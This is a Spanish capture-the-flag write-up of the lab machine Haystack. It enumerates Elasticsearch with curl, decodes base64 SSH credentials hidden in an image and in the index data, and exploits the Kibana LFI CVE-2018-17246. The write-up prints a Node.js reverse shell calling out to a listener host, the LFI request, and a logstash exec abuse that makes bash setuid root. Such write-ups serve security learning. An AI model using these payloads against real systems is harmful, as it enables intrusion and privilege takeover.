---
title: Haystack WriteUp
date: 2023-06-19
categories: [WriteUps, Máquinas Linux]
tags: [Information Leakage]
image:
  path: ../../assets/img/writeups/Haystack/haystack.jpg
  width: 528
  height: 340
  alt: Banner Haystack
---

Máquina bastante tipo CTF. Tuve que analizar una imagen para encontrar una pista, siguienda la pista y enumerando el servicio ElasticSearch encontraba las credenciales para ssh. Luego nos aprovechamos del servicio de kibana para convertirnos en otro usuario.

Para la escalada a root descubrimos unos archivos de configuración que parecen ejecutarse a intervalos regulares de tiempo y ejecutan como root el comando que nosotras escribamos en un fichero.

## Reconocimiento

La máquina que realizaremos hoy es la `Haystack` con ip `10.10.10.115`. Comprobaremos si hay conectividad con ella:
```bash
❯ ping -c 1 10.10.10.115
PING 10.10.10.115 (10.10.10.115) 56(84) bytes of data.
64 bytes from 10.10.10.115: icmp_seq=1 ttl=63 time=71.6 ms

--- 10.10.10.115 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 71.550/71.550/71.550/0.000 ms
```
1 paquete envíado, 1 paquete recibido, todo correcto.

Escaneamos los puertos de la máquina:
```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.115 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-19 10:24 CEST
Initiating SYN Stealth Scan at 10:24
Scanning 10.10.10.115 [65535 ports]
Discovered open port 22/tcp on 10.10.10.115
Discovered open port 80/tcp on 10.10.10.115
sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.10.115, 16) => Operation not permitted
Offending packet: TCP 10.10.14.9:38713 > 10.10.10.115:49743 S ttl=43 id=65459 iplen=44  seq=4051569908 win=1024 <mss 1460>
Discovered open port 9200/tcp on 10.10.10.115
sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.10.115, 16) => Operation not permitted
Offending packet: TCP 10.10.14.9:38713 > 10.10.10.115:31128 S ttl=58 id=37559 iplen=44  seq=4051569908 win=1024 <mss 1460>
Completed SYN Stealth Scan at 10:25, 26.38s elapsed (65535 total ports)
Nmap scan report for 10.10.10.115
Host is up, received user-set (0.051s latency).
Scanned at 2023-06-19 10:24:48 CEST for 27s
Not shown: 65500 filtered tcp ports (no-response), 32 filtered tcp ports (host-prohibited)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
9200/tcp open  wap-wsp syn-ack ttl 63
```
Esto significan las opciones:

* -p- : Escanea todos los puertos. Hay un total de 65535 puertos
* --open : Muestra únicamente los puertos abiertos.
* -sS : Realiza un TCP SYN Scan
* --min-rate 5000 : Para enviar paquetes no más lentos que 5000 paquetes por segundo
* -vvv : Muestra la información en pantalla mientras se realiza el escaneo
* -n : Para no aplicar resolución DNS
* -Pn : Para que no aplique el protocolo ARP
* 10.10.10.115 : Dirección IP objetivo, la cual quiero escanear
* -oG allPorts : Exportará el output a un fichero grepeable que llamaremos "allPorts"

Realizamos un escaneo algo más profundo de esos puertos:
```bash
❯ nmap -p22,80,9200 -sC -sV 10.10.10.115 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-19 10:28 CEST
Nmap scan report for 10.10.10.115
Host is up (0.050s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
80/tcp   open  http    nginx 1.12.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.12.2
9200/tcp open  http    nginx 1.12.2
|_http-title: Site doesn't have a title (application/json; charset=UTF-8).
| http-methods: 
|_  Potentially risky methods: DELETE
|_http-server-header: nginx/1.12.2
```
Tenemos el puerto 22/ssh y los puertos 80 y 9200 que parecen ser http. En el puerto 9200 uno de los scripts lanzados, el http-method nos indica que hay un riesgo potencial en el método DELETE de http.

## Buscando vulnerabilidades

Antes de investigar vulnerabilidades a ese método visto voy a analizar las web que tenemos. Primero usaré whatweb para comprobar que tecnologías corren por detrás de la web:
```bash
❯ whatweb http://10.10.10.115
http://10.10.10.115 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.12.2], IP[10.10.10.115], nginx[1.12.2]
❯ whatweb http://10.10.10.115:9200
http://10.10.10.115:9200 [200 OK] Country[RESERVED][ZZ], ElasticSearch[6.4.2], HTTPServer[nginx/1.12.2], IP[10.10.10.115], nginx[1.12.2]
```
El puerto 9200 corre un programa llamado ElasticSearch, y nos dicen hasta la versión, perfecto. ¿Qué es ElasticSearch?.
> Elasticsearch es un motor de búsqueda que se basa en Lucene el cual nos permite realizar búsquedas por una gran cantidad de datos de un texto específico. Está escrito en Java y se basa sobre una licencia Apache.  
En si mismo podríamos definir a Elasticsearch como un base de datos NoSQL orientada a documentos JSON, los cuales pueden ser consultados, creados, actualizados o borrados mediante un un sencillo API Rest.

Información anterior sacada de [aquí](https://www.arquitectoit.com/elasticsearch/que-es-elasticsearch/).

Entraré al navegador para ojear las páginas. Para el puerto 80:

![Web80]({{ 'assets/img/writeups/Haystack/webPuerto80.png' | relative_url }}){: .center-image }

Parece ser una aguja en un pajar, quizás nos quieren decir que buscar aquí será como la expresión de "es como buscar una aguja en un pajar", una pista que por aquí no hay nada que encontrar.

Por el puerto 9200:

![Web9200]({{ 'assets/img/writeups/Haystack/webPuerto9200.png' | relative_url }}){: .center-image }

Parece ser la API de ElasticSearch. Tenemos la versión de este servicio, busquemos por searchsploit vulnerabilidades existentes.
```bash
> searchsploit ElasticSearch

ElasticSearch - Remote Code Execution                                
ElasticSearch - Remote Code Execution                                
ElasticSearch - Search Groovy Sandbox Bypass (Metasploit)            
ElasticSearch 1.6.0 - Arbitrary File Download                        
ElasticSearch 7.13.3 - Memory disclosure                             
ElasticSearch < 1.4.5 / < 1.5.2 - Directory Traversal                
ElasticSearch Dynamic Script - Arbitrary Java Execution (Metasploit) 
Elasticsearch ECE 7.13.3 - Anonymous Database Dump   

# Al lado de estas líneas tendremos los exploits, pero no lo he copiado porque no se muestra muy bien
```
Las dos primeras de RCE son para versiones anteriores. Si entro dentro del exploit sale el CVE, buscando por internet ese CVE sale para que versiones es vulnerable. El de Memory disclosure es para la version: 7.10.0 to 7.13.3. Anonymus Database Dump: Version: >= 7.10.0 to <= 7.13.3 Y los de Metasploit para anteriores versiones. Así que en principio de aquí no podemos utilizar nada.

Hay un recurso en github. siempre que existe uno suelo entrar porque suelen estar bien explicados y con posibilidad de exploit.  
[https://github.com/mpgn/CVE-2018-17246](https://github.com/mpgn/CVE-2018-17246).  
En este recurso señala que se podría llegar a ejecutar una reverse shell. Pero leyendo un poco más parece que para conseguirlo tiene que ir acompañada de otra vulnerabilidad que permita escribir algún fichero dentro del servidor.  
La vulnerabilidad es sobre Kibana.  
> Kibana es un software de tablero de visualización de datos disponible en la fuente para Elasticsearch,

La ruta para el LFI que indica la página es:
```
/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../path/to/shell.js
```
Intentando meter esa misma ruta en la web me da problemas, y con razón, aunque trabajen conjuntamente un servicio es Elasticsearch y otro es Kibana, tienen hasta puertos distintos, el de kibana suele ser el puerto **5601**, cuando tenga acceso a este puerto podría intentar explotar esa vulnerabilidad, de momento no.

De momento tenemos el servicio de ElasticSearch que podemos enumerar, recomiendo siempre que no sepas que hacer con un servicio acudir a **hacktricks**. Para enumerar este servicio tenemos esta [página](https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch).

Es esa página nos salen algunos recursos para enumurar, el primero sería para autenticarnos pero no tenemos credenciales así que de momento pasamos a los siguientes recursos a enumerar:
```bash
❯ curl -s -X GET "http://10.10.10.115:9200/_security/role"
{"error":"Incorrect HTTP method for uri [/_security/role] and method [GET], allowed: [POST]","status":405}                                                                             ❯ curl -s -X POST "http://10.10.10.115:9200/_security/role"
{"error":{"root_cause":[{"type":"parse_exception","reason":"request body is required"}],"type":"parse_exception","reason":"request body is required"},"status":400}#                    

❯ curl -s -X GET "http://10.10.10.115:9200/_security/user"
{"error":"Incorrect HTTP method for uri [/_security/user] and method [GET], allowed: [POST]","status":405}# 
```
De momento nada, pero hay que seguir. Veo esto en hacktricks; You can gather all the indices accessing `http://10.10.10.115:9200/_cat/indices?v `.  
Se podría decir que estos índices serían como unas bases de datos.
```bash
❯ curl -s -X GET "http://10.10.10.115:9200/_cat/indices?v"
health status index   uuid                   pri rep docs.count docs.deleted store.size pri.store.size
green  open   .kibana 6tjAYZrgQ5CwwR0g6VOoRg   1   0          1            0        4kb            4kb
yellow open   quotes  ZG2D1IqkQNiNZmi2HRImnQ   5   1        253            0    262.7kb        262.7kb
yellow open   bank    eSVpNfCfREyYoVigNWcrMw   5   1       1000            0    483.2kb        483.2kb
```
Muuy bien, esto empieza a funcionar. Ahora obtenemos la información de cada uno:
```bash
curl -s -X GET "http://10.10.10.115:9200/.kibana" | jq

# jq porque la información en formato jason. Sale información pero nada interesante. Hago lo mismo con las otras dos index, pero no veo nada.

curl -s -X GET "http://10.10.10.115:9200/quotes" | jq

curl -s -X GET "http://10.10.10.115:9200/bank" | jq
```
Se supone que de esta manera no se muestra toda la información. Según leo por defecto hay un límite de 10 documentos por index, para averiguar cuantos hay en total para cada index se tendría que hacer esto:
```bash
> curl -s -X GET "http://10.10.10.115:9200/quotes/_search?pretty=true" | jq | grep hits -C 
 "total": 5,
    "successful": 5,
    "skipped": 0,
    "failed": 0
  },
  "hits": {
    "total": 253,
    "max_score": 1,
    "hits": [
      {
        "_index": "quotes",
        "_type": "quote",
        "_id": "14",
        "_score": 1,
``` 
En el caso de el index quotes habría 253. Tampoco hace falta averiguar el de cada uno, poniendo 1000 supongo que será suficiente para mostrarlos todos:
```bash
❯ curl -s -X GET "http://10.10.10.115:9200/quotes/_search?pretty=true&size=1000" | wc -l
2293

# Hay mucha información. Filtraré por palabras clave como user o passwd.

❯ curl -s -X GET "http://10.10.10.115:9200/quotes/_search?pretty=true&size=1000" | jq | grep -iE "user|passwd|password"

# Nada, pero como toda la data está en español, buscaré en español:

❯ curl -s -X GET "http://10.10.10.115:9200/quotes/_search?pretty=true&size=1000" | jq | grep -iE "usuario|contraseña"
          "quote": "El valor del transporte urbano depende de la combinación de tipo de transporte elegido por el usuario, es así como ....y sigue
```
Realizo lo mismo para las otras dos index/bases de datos y nada.

Tendría que recordar de vez en cuando que esto son **CTF** y que no tiene porque ser una máquina super realista. Bien ¿os acordáis de la extraordinario deducción de la aguja en el pajar?. Pues fue una mierda. Me descargo la imagen y la analizo:
```bash
❯ exiftool needle.jpg
ExifTool Version Number         : 12.16
File Name                       : needle.jpg
Directory                       : .
File Size                       : 179 KiB
File Modification Date/Time     : 2023:06:19 17:12:50+02:00
File Access Date/Time           : 2023:06:19 17:12:50+02:00
File Inode Change Date/Time     : 2023:06:19 17:13:16+02:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
# Hay más pero nada. Esta herramienta sirve para ver metadatos

❯ steghide info needle.jpg
"needle.jpg":
  formato: jpeg
  capacidad: 7,5 KB
Intenta informarse sobre los datos adjuntos? (s/n) s
Anotar salvoconducto: 
steghide: no pude extraer ningn dato con ese salvoconducto!
# Me pide una contraseña, que no tenga. Aunque pida contraseña no quiere decir que contenta algo.

> strings needle.jpg
# salen muchas cadenas pequeñas, así que filtro por cadenas más largas que 15:
> string needle.jpg -n 15
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
```
Esa última línea parece una cadena en base 64.
```bash
❯ echo -n "bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==" | base64 -d; echo
la aguja en el pajar es "clave"
```
Con esta pista quizás podamos encontrar algo en la enumeración anterior. Ahora filtraremos por "clave". Si lo hacemos en el index quotes encontramos algo:
```bash
❯ curl -s -X GET "http://10.10.10.115:9200/quotes/_search?pretty=true&size=1000" | jq | grep clave
          "quote": "Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="
          "quote": "Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "
```
Parecen ser cadenas en base64 también. Decodifiquemos:
```bash
❯ echo -n "cGFzczogc3BhbmlzaC5pcy5rZXk=" | base64 -d;echo
pass: spanish.is.key
❯ echo -n "dXNlcjogc2VjdXJpdHkg" | base64 -d;echo
user: security
```
Podrían ser las credenciales de acceso por ssh:
```bash
❯ ssh security@10.10.10.115
The authenticity of host '10.10.10.115 (10.10.10.115)' can't be established.
ECDSA key fingerprint is SHA256:ihn2fPA4jrn1hytN0y9Z3vKpIKuL4YYe3yuESD76JeA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.115' (ECDSA) to the list of known hosts.
security@10.10.10.115's password: 
Last login: Wed Feb  6 20:53:59 2019 from 192.168.2.154
[security@haystack ~]$ 
```
Y sí, estamos dentro.

```bash
[security@haystack ~]$ export TERM=xterm
[security@haystack ~]$ ls -l
total 4
-rw-r--r--. 1 security security 33 jun 19 04:19 user.txt
[security@haystack ~]$ cat user.txt
a44485ccd00c390dc1f149d******
```

## Escalada de privilegios

```bash
[security@haystack ~]$ id
uid=1000(security) gid=1000(security) grupos=1000(security) contexto=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[security@haystack ~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for security: 
Sorry, user security may not run sudo on haystack.
```
Podría seguir con el procedimiento habitual de la escalada peeero recuerda que antes encontramos una vulnerabilidad en **kibana** pero no teníamos acceso al servicio:
```bash
[security@haystack ~]$ ss -nltp
State      Recv-Q Send-Q                       Local Address:Port 
LISTEN     0      128                                   *:80   
LISTEN     0      128                                   *:9200 
LISTEN     0      128                                   *:22   
LISTEN     0      128                                   127.0.0.1:5601 
LISTEN     0      128                                   ::ffff:127.0.0.1:9000 
LISTEN     0      128                                   :::80   
LISTEN     0      128                                   ::ffff:127.0.0.1:9300 
LISTEN     0      128                                   :::22   
LISTEN     0      50                                   ::ffff:127.0.0.1:9600 
```

Y encontramos el puerto 5601 perteneciente a kibana. Recuerdo la página de github que hablan de la explotación; [CVE-2018-17246](https://github.com/mpgn/CVE-2018-17246).

Somos el usuario Security, entiendo que si la explotamos podremos convertirnos en el usuario que corre kibana.
```bash
[security@haystack ~]$ ps -faux | grep kibana
kibana     6335  0.4  5.3 1355892 208148 ?      Ssl  04:18   2:10 /usr/share/kibana/bin/../node/bin/node --no-warnings /usr/share/kibana/bin/../src/cli -c /etc/kibana/kibana.yml
security  16502  0.0  0.0 112728   968 pts/0    S+   11:47   0:00              \_ grep --color=auto kibana
```
El usuario que corre kibana es kibana.

Siguiendo la página del exploit. Alojaremos en la máquina víctima un shell.js que nos dará una reverse shell cuando llamemos al recurso desde el servicio de kibana. Piensa que la CVE es realmente solo un LFI, pero como podemos escribir archivos dentro de la máquina (ya que estamos dentro) podemos conseguir la reverse.
```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(1337, "172.18.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```
```bash
[security@haystack shm]$ pwd
/dev/shm
[security@haystack shm]$ ls
shell.js
[security@haystack shm]$ chmod +x shell.js 
```
```bash
[security@haystack shm]$ curl -X GET "http://localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../dev/shm/shell.js"
```
Y desde mi máquina local en escucha:
```bash
❯ nc -nlvp 444
listening on [any] 444 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.115] 34306
whoami
kibana
```
He realizado un pivoting de usuarios.

Toca hacer el tratamiento de la tty
```bash
script /dev/null -c bash
This account is currently not available.
Script iniciado; el fichero es /dev/null
# No se puede realizar el tratamiento típico. Probaré con python
python -c 'import pty;pty.spawn("/bin/bash")'
bash-4.2$ ^Z
zsh: suspended  nc -nlvp 444
```
Y desde local:
```bash
stty raw -echo; fg
    reset xterm
```
Y nos devuelve una consola en la máquina objetivo:
```bash
bash-4.2$ export TERM=xterm
bash-4.2$ export SHELL=bash
bash-4.2$ stty rows 38 columns 184
```
Completamos el tratamiento de la tty. Nos toca escalar a root y ahora somos el usuario kirvana, quizás podamos hacer algo más.
```bash
bash-4.2$ id
uid=994(kibana) gid=992(kibana) grupos=992(kibana) contexto=system_u:system_r:unconfined_service_t:s0

bash-4.2$ sudo -l 
# Pide contraseña que no tenemos.

bash-4.2$ find / \-perm -4000 2>/dev/null
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/crontab
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/sbin/usernetctl
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
# Podríamos escalar debido al suid en pkexec con pwntool peeero la máquina no está hecha para hacerlo así.
```
Buscaré ficheros en los que el usuario kibana sea el propietario:
```bash
bash-4.2$ find / -user kibana 2>/dev/null | grep -vE "share|var|proc"
/dev/pts/1
/etc/logstash/startup.options
/opt/kibana
# Quite resultados como share, var y proc porque salían muchos.

bash-4.2$ cd /opt/kibana
bash-4.2$ ls -la
total 0
drwxr-x---. 2 kibana kibana  6 jun 20  2019 .
drwxr-xr-x. 3 root   root   20 jun 18  2019 ..

bash-4.2$ cd /etc/logstash
bash-4.2$ ls -la
total 56
drwxr-xr-x.  3 root   root   4096 jun 18  2019 .
drwxr-xr-x. 85 root   root   8192 mar 28  2022 ..
drwxrwxr-x.  2 root   kibana   62 jun 24  2019 conf.d
-rw-r--r--.  1 root   kibana 1850 nov 28  2018 jvm.options
-rw-r--r--.  1 root   kibana 4466 sep 26  2018 log4j2.properties
-rw-r--r--.  1 root   kibana  342 sep 26  2018 logstash-sample.conf
-rw-r--r--.  1 root   kibana 8192 ene 23  2019 logstash.yml
-rw-r--r--.  1 root   kibana 8164 sep 26  2018 logstash.yml.rpmnew
-rw-r--r--.  1 root   kibana  285 sep 26  2018 pipelines.yml
-rw-------.  1 kibana kibana 1725 dic 10  2018 startup.options

bash-4.2$ cd conf.d
/etc/logstash/conf.d
bash-4.2$ ls -la
total 16
drwxrwxr-x. 2 root kibana   62 jun 24  2019 .
drwxr-xr-x. 3 root root   4096 jun 18  2019 ..
-rw-r-----. 1 root kibana  131 jun 20  2019 filter.conf
-rw-r-----. 1 root kibana  186 jun 24  2019 input.conf
-rw-r-----. 1 root kibana  109 jun 24  2019 output.conf
```
Mmmmm curioso, voy a revisar esos archivos .conf:
```bash
bash-4.2$ cat input.conf
input {
	file {
		path => "/opt/kibana/logstash_*"
		start_position => "beginning"
		sincedb_path => "/dev/null"
		stat_interval => "10 second"
		type => "execute"
		mode => "read"
	}
}
bash-4.2$ cat filter.conf
filter {
	if [type] == "execute" {
		grok {
			match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
		}
	}
}
bash-4.2$ cat output.conf 
output {
	if [type] == "execute" {
		stdout { codec => json }
		exec {
			command => "%{comando} &"
		}
	}
}
```
Tiene toda la pinta que el conjunto de un proceso que se debe ejecutar a intervalos regulares de tiempo. Podríamos comprobarlo lanzando la herramienta pspy por ejemplo, pero no hará falta, lo voy a suponer. 

Parece que busca un fichero en /opt/kibana que empieze por logstash_LOQUESEA y que contenga (po lo que pone en filter.conf) esta  "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}", despúes se ejecutará ese comando.
```bash
ash-4.2$ vim /opt/kibana/logstash_ese
Ejecutar comando : chmod u+s /bin/bash

bash-4.2$ ls -l /bin/bash
-rwsr-xr-x. 1 root root 964608 oct 30  2018 /bin/bash
bash-4.2$ bash -p
bash-4.2# whoami
root
bash-4.2# cat /root/root.txt
55ca3e58cc55bff592d09b*******
```
Y máquina Haystack hackeada!!!!. Vaya telita con la imagen, peeero bueeeeno ha estado chula, es un CTF y tienes que pensar en que esto puede pasar. He aprendido que aunque un servicio este ligado a otro no quiere decir que corran mismo puerto, me refiero al ElasticSearch y el Kibana. Es importante enumerar y seguir probando, esta vez fue con la ayuda de hacktricks.


